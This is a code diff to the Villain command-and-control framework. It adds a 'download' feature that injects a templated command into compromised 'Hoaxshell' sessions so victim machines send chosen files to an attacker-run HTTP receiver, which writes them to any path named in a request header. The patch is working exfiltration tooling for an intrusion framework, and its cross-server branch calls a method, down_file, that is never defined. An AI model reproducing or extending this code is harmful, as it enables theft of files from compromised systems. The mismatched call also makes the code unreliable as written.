@@ -6,7 +6,8 @@
 # https://github.com/t3l3machus/Villain
 
 
-import ssl, struct
+import ssl, struct, threading
+from urllib.parse import urlparse, parse_qs
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from warnings import filterwarnings
 from ast import literal_eval
@@ -17,6 +18,9 @@ from .logging import *
 filterwarnings("ignore", category = DeprecationWarning)
 
 registered_services = []
+
+ticketg = str(uuid4())
+ticketg_lock = threading.Lock()
 
 
 def print_running_services_info():
@@ -924,7 +928,17 @@ class Hoaxshell(BaseHTTPRequestHandler):
 						else:
 							continue
 
-
+					elif cmd_list[0] == 'download':
+					
+						Hoaxshell.prompt_ready = False
+						remote_file_path = cmd_list[1]
+						local_dest_path = os.path.expanduser(cmd_list[2])
+																
+						session_owner_id = Sessions_Manager.return_session_attr_value(session_id, 'Owner')
+						if session_owner_id == Core_Server.return_server_uniq_id():
+							File_Smuggler.download_file(remote_file_path, local_dest_path, session_id)					
+						else:
+							Hoaxshell.set_shell_prompt_ready()
 
 					elif cmd_list[0] == 'upload':
 
@@ -953,7 +967,6 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 									else:
 										Core_Server.send_receive_one_encrypted(session_owner_id, [file_contents, out_path, session_id], 'upload_file')
-
 							else:
 								print(f'\r[{ERR}] file {file_path} not found.')
 								Hoaxshell.set_shell_prompt_ready()
@@ -1721,6 +1734,11 @@ class Core_Server:
 
 						Core_Server.send_msg(conn, self.response_ack(sibling_id))
 
+
+					elif decrypted_data[0] == 'download_file':
+						File_Smuggler.down_file(decrypted_data[1][0], decrypted_data[1][1], decrypted_data[1][2], issuer = sibling_id)
+						Core_Server.send_msg(conn, self.response_ack(sibling_id))
+						Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()
 
 
 					elif decrypted_data[0] == 'upload_file':
@@ -3239,6 +3257,41 @@ class File_Smuggler_Http_Handler(BaseHTTPRequestHandler):
 	def log_message(self, format, *args):
 		return
 
+class FileReceiverHandler(BaseHTTPRequestHandler):
+	def do_POST(self):
+		global ticketg
+		content_length = int(self.headers['Content-Length'])
+		file_data = self.rfile.read(content_length)
+
+		dest_path = self.headers.get('Destination-Path')
+		req_ticket = self.path.strip("/")
+		
+		with ticketg_lock:
+			ticket = ticketg
+
+		# Validate the ticket
+		if ticket != req_ticket:
+			self.send_response(403)
+			self.end_headers()
+			self.wfile.write(b"Forbidden: Invalid or missing ticket.")
+			return
+	
+		# The ticket is valid
+		# Ensure the destination directory exists
+		dest_dir = os.path.dirname(dest_path)
+		if not os.path.exists(dest_dir):
+			os.makedirs(dest_dir)
+
+		with open(dest_path, "wb") as f:
+			f.write(file_data)
+
+		# Reset ticketg so that an intercept can't re-use this ticket
+		with ticketg_lock:
+			ticketg = str(uuid4())
+
+		self.send_response(200)
+		self.end_headers()
+		self.wfile.write(b"File received and saved.")
 
 
 class File_Smuggler:
@@ -3247,6 +3300,9 @@ class File_Smuggler:
 	file_transfer_tickets = {}
 
 	Utilities = {
+		'download' : {
+			'supported' : ['powershell.exe', 'unix', 'zsh', 'cmd.exe']
+		},
 		'fileless_exec' : {
 			'supported' : ['powershell.exe', 'unix', 'zsh', 'cmd.exe']
 		},
@@ -3265,6 +3321,15 @@ class File_Smuggler:
 
 		except:
 			exit(f'\n[{DEBUG}] {self.server_name} failed to start (Unknown error occurred).\n')
+
+		def start_receiver_server():
+			httpd_rec = HTTPServer(('0.0.0.0', File_Smuggler_Settings.receive_port), FileReceiverHandler)
+			print(f"Server running on port {File_Smuggler_Settings.receive_port}...\n")
+			httpd_rec.serve_forever()
+
+		# Run the server in a separate thread
+		server_thread = threading.Thread(target=start_receiver_server, daemon=True)
+		server_thread.start()
 
 		http_file_smuggler_server = Thread(target = httpd.serve_forever, args = (), name = 'http_file_smuggler')
 		http_file_smuggler_server.daemon = True
@@ -3285,7 +3350,44 @@ class File_Smuggler:
 		del file_contents
 		return ticket
 
+	@staticmethod
+	def download_file(remote_file_path, local_dest_path, session_id, issuer='self', port=File_Smuggler_Settings.receive_port, \
+        base=f'{cwd}{os.sep}Utilities{os.sep}Shell{os.sep}download{os.sep}http{os.sep}'):
 
+		# Determine shell type
+		shell_type = Sessions_Manager.active_sessions[session_id]['Shell']
+		try:
+
+			# Create smuggle ticket
+			ticket = File_Smuggler.create_smuggle_ticket(remote_file_path, issuer)
+			with ticketg_lock:
+				global ticketg
+				ticketg = ticket
+
+			server_ip = Sessions_Manager.active_sessions[session_id]['iface']
+
+			ext = bin2ext[shell_type]
+			utility = f'{base}src{ext}'
+			src = get_file_contents(utility, mode='r')
+
+			if not src:
+				File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{ERR}] Failed to read utility source files.')
+				return
+
+			request_file_cmd = multi_set(src, {'*LHOST*': server_ip, '*LPORT*': port, '*TICKET*': ticket, '*SRC*': remote_file_path, '*DEST*': local_dest_path})
+
+			# Debugging: Print the constructed command
+			# print(f"\nInjecting Constructed command: {request_file_cmd}\n")
+
+            # Construct Villain issued command to request file
+			villain_cmd = {
+                'data': request_file_cmd,
+                'issuer': issuer,
+                'quiet': False
+            }
+			Hoaxshell.command_pool[session_id].append(villain_cmd)
+		except:
+			File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{ERR}] Download function failed.')
 
 	@staticmethod
 	def upload_file(file_contents, destination_path, session_id, issuer = 'self', port = File_Smuggler_Settings.bind_port, \
